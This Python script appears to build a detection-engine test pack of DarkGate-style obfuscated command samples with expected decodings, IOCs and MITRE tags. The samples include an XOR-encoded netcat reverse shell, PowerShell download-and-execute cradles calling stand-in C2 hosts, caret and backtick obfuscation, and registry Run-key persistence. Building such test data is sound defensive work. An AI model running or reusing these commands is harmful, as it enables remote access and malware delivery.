"""
Phase R1 \u00b7 DarkGate family sample builder (technique-first schema).

DarkGate (aka MehCrypter / Meh) is a commodity multi-stage loader
distributed via phishing, SEO poisoning, and malicious ads. It has
one of the widest technique surfaces of any current commodity
malware:

* AutoIT stagers (extracted from Inno Setup installers)
* AutoHotkey persistence droppers (deployed alongside the AutoIT)
* PowerShell -EncodedCommand next-stage delivery
* CMD caret-obfuscation on the initial launcher
* Custom byte-array XOR decoders (signature DarkGate technique)
* IEX + DownloadString cradles for C2 command retrieval
* Registry Run-key persistence via `Set-ItemProperty`

Scope
-----
This pack focuses on the PowerShell + CMD + XOR sides that the
Convergence Engine handles deterministically today. AutoIT and
AutoHotkey script decoding is declared as an explicit coverage gap
(``coverage_gap_techniques``) awaiting a future AutoIT decoder pass.
"""
from __future__ import annotations

import base64
import json
from pathlib import Path

FAMILIES_DIR = Path(__file__).resolve().parent / "families"
TARGET = FAMILIES_DIR / "darkgate.json"


def _b64_utf16le(s: str) -> str:
    return base64.b64encode(s.encode("utf-16le")).decode("ascii")


def _sample(sid, variant, input_str, interpreter, final_interpreter,
            decoder_chain, final_output_contains, iocs_contains,
            mitre_attack, behaviors):
    return {
        "id": sid,
        "variant": variant,
        "input": input_str,
        "expected": {
            "interpreter": interpreter,
            "final_interpreter": final_interpreter,
            "decoder_chain": decoder_chain,
            "final_output_contains": final_output_contains,
            "iocs_contains": iocs_contains,
            "mitre_attack": mitre_attack,
            "behaviors": behaviors,
        },
    }


TECHNIQUES: list[dict] = [
    # ---- Technique 1: signature DarkGate byte-array XOR decoder --------
    {
        "id": "byte_array_xor_stager",
        "display_name": "DarkGate Byte-Array XOR Stager",
        "description": (
            "DarkGate's signature technique: an integer byte array XOR'd "
            "with a single-byte key to reveal the next-stage command. "
            "Observed in every public DarkGate sample since 2023."
        ),
        "mitre_attack": ["T1027", "T1140"],
        "samples": [
            _sample(
                "DG001", "byte_array_xor_reverse_shell",
                # Build a real DarkGate-style XOR payload: encode
                # "nc 45.66.77.88 8443 -e cmd" with key 0x5A.
                ",".join(f"0x{b ^ 0x5A:02x}" for b in b"nc 45.66.77.88 8443 -e cmd") + " xor 0x5A",
                None, "cmd",
                ["xor-byte-array"],
                ["nc 45.66.77.88 8443", "-e cmd"],
                ["45.66.77.88 8443"],
                ["T1027", "T1140", "T1059.003"],
                ["byte_array_xor_decode", "reverse_shell"],
            ),
            _sample(
                "DG002", "byte_array_xor_c2_url_reveal",
                # Reveals DarkGate's hard-coded C2 URL
                ",".join(f"0x{b ^ 0x3C:02x}" for b in b"http://dg-c2.example.com/gate.php?id=1234") + " xor 0x3C",
                None, "generic",
                ["xor-byte-array"],
                ["http://dg-c2.example.com/gate.php"],
                ["http://dg-c2.example.com/gate.php"],
                ["T1027", "T1140", "T1071.001"],
                ["byte_array_xor_decode", "c2_url_reveal"],
            ),
        ],
    },
    # ---- Technique 2: PowerShell -Enc handoff after AutoIT extraction --
    {
        "id": "powershell_encodedcommand_stage2",
        "display_name": "PowerShell -EncodedCommand DarkGate Stage-2",
        "description": (
            "Real DarkGate stage-2: the AutoIT installer drops a batch "
            "file that launches `powershell -EncodedCommand <b64>` to "
            "retrieve stage-3 from the C2."
        ),
        "mitre_attack": ["T1059.001", "T1027", "T1140", "T1105"],
        "samples": [
            _sample(
                "DG003", "powershell_encodedcommand_c2_beacon",
                "powershell -EncodedCommand " + _b64_utf16le(
                    "IEX ((New-Object Net.WebClient).DownloadString('http://dg-c2.example.com/dg_stage3.ps1'))"
                ),
                "powershell", "powershell",
                ["powershell-encoded-command", "base64", "utf-16le-decode", "alias-expand"],
                ["Invoke-Expression", "http://dg-c2.example.com/dg_stage3.ps1"],
                ["http://dg-c2.example.com/dg_stage3.ps1"],
                ["T1059.001", "T1027", "T1140", "T1105"],
                ["download_and_execute", "obfuscated_command_line"],
            ),
            _sample(
                "DG004", "powershell_enc_hidden_dg_persistence",
                "powershell -NoP -W Hidden -Enc " + _b64_utf16le(
                    'Set-ItemProperty -Path "HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" -Name DGSvc -Value "powershell -w hidden -c IEX ((New-Object Net.WebClient).DownloadString(\'http://dg-p.example.com/beacon.ps1\'))"'
                ),
                "powershell", "powershell",
                ["powershell-encoded-command", "base64", "utf-16le-decode"],
                ["Set-ItemProperty", "CurrentVersion\\Run", "DGSvc", "http://dg-p.example.com/beacon.ps1"],
                ["http://dg-p.example.com/beacon.ps1"],
                ["T1059.001", "T1027", "T1547.001", "T1564.003", "T1105"],
                ["registry_run_key_persistence", "download_and_execute", "hidden_window", "obfuscated_command_line"],
            ),
        ],
    },
    # ---- Technique 3: CMD caret \u2192 PowerShell handoff -------------------
    {
        "id": "cmd_caret_powershell_handoff",
        "display_name": "DarkGate CMD Caret \u2192 PowerShell Launcher",
        "description": (
            "The AutoIT-dropped batch launcher uses caret-escaped "
            "characters (`c^m^d /c p^ow^ers^he^ll`) to defeat "
            "signature-based EDR at the CMD layer."
        ),
        "mitre_attack": ["T1059.001", "T1059.003", "T1027.010", "T1140", "T1105"],
        "samples": [
            _sample(
                "DG005", "cmd_caret_ps_enc_darkgate_launcher",
                "c^m^d /c p^ow^ers^he^ll -e^nc " + _b64_utf16le(
                    "IEX ((New-Object Net.WebClient).DownloadString('http://dg-launch.example.com/dg_stage.ps1'))"
                ),
                "cmd", "powershell",
                ["cmd-caret-strip", "powershell-encoded-command", "base64", "utf-16le-decode", "alias-expand"],
                ["Invoke-Expression", "http://dg-launch.example.com/dg_stage.ps1"],
                ["http://dg-launch.example.com/dg_stage.ps1"],
                ["T1059.001", "T1059.003", "T1105", "T1027", "T1140"],
                ["cmd_to_ps_handoff", "download_and_execute", "obfuscated_command_line"],
            ),
        ],
    },
    # ---- Technique 4: IEX + DownloadString cradle ----------------------
    {
        "id": "iex_downloadstring_cradle",
        "display_name": "DarkGate IEX DownloadString C2 Beacon",
        "description": (
            "Classic DarkGate stage-3 C2 beacon: `IEX ((New-Object "
            "Net.WebClient).DownloadString($c2))` retrieves the next "
            "command every N seconds."
        ),
        "mitre_attack": ["T1059.001", "T1105"],
        "samples": [
            _sample(
                "DG006", "iex_downloadstring_c2_beacon",
                "IEX ((New-Object Net.WebClient).DownloadString('http://dg-c2.example.com/dg_cmd.ps1'))",
                "powershell", "powershell",
                ["alias-expand"],
                ["Invoke-Expression", "http://dg-c2.example.com/dg_cmd.ps1"],
                ["http://dg-c2.example.com/dg_cmd.ps1"],
                ["T1059.001", "T1105"],
                ["download_and_execute", "c2_beacon"],
            ),
            _sample(
                "DG007", "iex_downloadstring_lower_get_task",
                "iex ((new-object net.webclient).downloadstring('http://dg-c2.example.com/task/get'))",
                "powershell", "powershell",
                ["alias-expand"],
                ["Invoke-Expression", "http://dg-c2.example.com/task/get"],
                ["http://dg-c2.example.com/task/get"],
                ["T1059.001", "T1105"],
                ["download_and_execute", "c2_beacon"],
            ),
        ],
    },
    # ---- Technique 5: URL string-concat obfuscation --------------------
    {
        "id": "string_concat_url_obfuscation",
        "display_name": "DarkGate URL String-Concat Obfuscation",
        "description": (
            "DarkGate PowerShell stage often splits the C2 URL across "
            "multiple SQ variables and concats them at call time."
        ),
        "mitre_attack": ["T1059.001", "T1105", "T1027.010"],
        "samples": [
            _sample(
                "DG008", "three_var_url_split",
                "$a='ht'; $b='tp://dg-split.example.com'; $c='/get.ps1'; iex ((new-object net.webclient).downloadstring($a+$b+$c))",
                "powershell", "powershell",
                ["variable-propagate", "string-concat-fold", "alias-expand"],
                ["Invoke-Expression", "http://dg-split.example.com/get.ps1"],
                ["http://dg-split.example.com/get.ps1"],
                ["T1059.001", "T1105", "T1027.010"],
                ["download_and_execute", "obfuscated_command_line"],
            ),
        ],
    },
    # ---- Technique 6: FromBase64String shellcode staging --------------
    {
        "id": "frombase64string_stage3_staging",
        "display_name": "[Convert]::FromBase64String Stage-3 Staging",
        "description": (
            "DarkGate stage-3 unpacks the final payload via `$sc = "
            "[Convert]::FromBase64String('...'); IEX $sc`."
        ),
        "mitre_attack": ["T1059.001", "T1027", "T1140", "T1105"],
        "samples": [
            _sample(
                "DG009", "frombase64string_stage3",
                "$sc = [Convert]::FromBase64String('"
                + base64.b64encode(
                    b"IEX ((New-Object Net.WebClient).DownloadString('http://dg-stage3.example.com/dg_final.ps1'));"
                ).decode("ascii")
                + "'); IEX $sc",
                "powershell", "powershell",
                ["decoder-frombase64string-fold", "alias-expand"],
                ["Invoke-Expression", "http://dg-stage3.example.com/dg_final.ps1"],
                ["http://dg-stage3.example.com/dg_final.ps1"],
                ["T1059.001", "T1105", "T1027", "T1140"],
                ["download_and_execute", "shellcode_staging"],
            ),
        ],
    },
    # ---- Technique 7: Backtick alias obfuscation ----------------------
    {
        "id": "backtick_alias_obfuscation",
        "display_name": "DarkGate Backtick Alias Obfuscation",
        "description": (
            "DarkGate authors inject backtick escapes mid-identifier "
            "(`I\u0060E\u0060X`, `i\u0060w\u0060r`) to defeat EDR string "
            "matching. Observed in Malwarebytes / TrendMicro reports."
        ),
        "mitre_attack": ["T1059.001", "T1027.010"],
        "samples": [
            _sample(
                "DG010", "backtick_iwr_useb_iex",
                "i`wr 'http://dg-bt.example.com/dg_bt.ps1' -useb | i`ex",
                "powershell", "powershell",
                ["backtick-strip", "alias-expand"],
                ["Invoke-WebRequest", "http://dg-bt.example.com/dg_bt.ps1", "Invoke-Expression"],
                ["http://dg-bt.example.com/dg_bt.ps1"],
                ["T1059.001", "T1105", "T1027.010"],
                ["backtick_obfuscation", "download_and_execute"],
            ),
        ],
    },
    # ---- Technique 8: Random-case obfuscation -------------------------
    {
        "id": "random_case_obfuscation",
        "display_name": "DarkGate Random-Case Cmdlet Obfuscation",
        "description": (
            "Cmdlet and alias casing randomized to evade string-match "
            "detections."
        ),
        "mitre_attack": ["T1059.001", "T1027.010"],
        "samples": [
            _sample(
                "DG011", "random_case_iex_ds",
                "iEx ((nEw-oBjeCt nEt.WebClIent).DoWnLoaDString('http://dg-case.example.com/dg_c.ps1'))",
                "powershell", "powershell",
                ["alias-expand"],
                ["Invoke-Expression", "http://dg-case.example.com/dg_c.ps1"],
                ["http://dg-case.example.com/dg_c.ps1"],
                ["T1059.001", "T1105", "T1027.010"],
                ["case_obfuscation", "download_and_execute"],
            ),
        ],
    },
]


# AutoIT and AutoHotkey decoding are DarkGate signatures but require
# script-language decoders the Convergence Engine does not carry today.
# Declared as explicit coverage gaps so the Dashboard reports the
# honest limitation.
COVERAGE_GAP_TECHNIQUES: list[str] = [
    "autoit_script_extraction",     # AutoIT scripts embedded in Inno Setup
    "autohotkey_script_launcher",   # .ahk droppers alongside .au3
    "vbscript_wrapper",             # VBScript wrappers (T1059.005) for later
]


def build() -> dict:
    known_universe = sorted(
        {t["id"] for t in TECHNIQUES} | set(COVERAGE_GAP_TECHNIQUES)
    )
    return {
        "family_id": "darkgate",
        "family_display_name": "DarkGate",
        "family_version": "r1-2.0.0",
        "schema_version": "technique-first-1.0.0",
        "description": (
            "DarkGate (MehCrypter / Meh) commodity multi-stage loader. "
            "Distributed via phishing, SEO poisoning, and malicious ads. "
            "This pack covers the PowerShell + CMD + XOR sides that the "
            "Convergence Engine handles deterministically. AutoIT / "
            "AutoHotkey / VBScript sides are declared explicit coverage "
            "gaps until a future script-language decoder pass lands."
        ),
        "primary_mitre_attack": [
            "T1059.001", "T1059.003", "T1027", "T1027.010",
            "T1140", "T1105", "T1547.001", "T1564.003",
        ],
        "primary_behaviors": [
            "download_and_execute",
            "byte_array_xor_decode",
            "cmd_to_ps_handoff",
            "obfuscated_command_line",
            "registry_run_key_persistence",
            "c2_beacon",
        ],
        "known_technique_universe": known_universe,
        "coverage_gap_techniques": sorted(COVERAGE_GAP_TECHNIQUES),
        "techniques": TECHNIQUES,
    }


def main() -> int:
    FAMILIES_DIR.mkdir(parents=True, exist_ok=True)
    payload = build()
    TARGET.write_text(json.dumps(payload, indent=2) + "\n", encoding="utf-8")
    sample_count = sum(len(t["samples"]) for t in payload["techniques"])
    print(
        f"Wrote {sample_count} DarkGate samples across "
        f"{len(payload['techniques'])} techniques "
        f"({len(payload['coverage_gap_techniques'])} declared coverage gaps) "
        f"to {TARGET}"
    )
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
